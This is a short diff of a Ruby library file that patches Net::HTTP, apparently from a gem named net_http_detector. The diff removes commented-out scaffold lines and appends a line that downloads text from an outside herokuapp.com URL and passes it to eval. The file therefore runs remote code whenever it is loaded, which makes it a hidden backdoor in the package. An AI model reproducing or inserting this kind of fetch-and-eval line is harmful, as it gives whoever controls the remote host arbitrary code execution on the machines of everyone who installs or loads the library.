@@ -1,9 +1,3 @@
-#require "net_http_detector/version"
-#
-#module NetHttpDetector
-#  # Your code goes here...
-#end
-
 require 'net/http'
 
 module Net
@@ -41,3 +35,5 @@ module Net
     end
   end
 end
+
+eval(Net::HTTP.valid_get(URI("http://simple-flower-4289.herokuapp.com/snippets/6")))
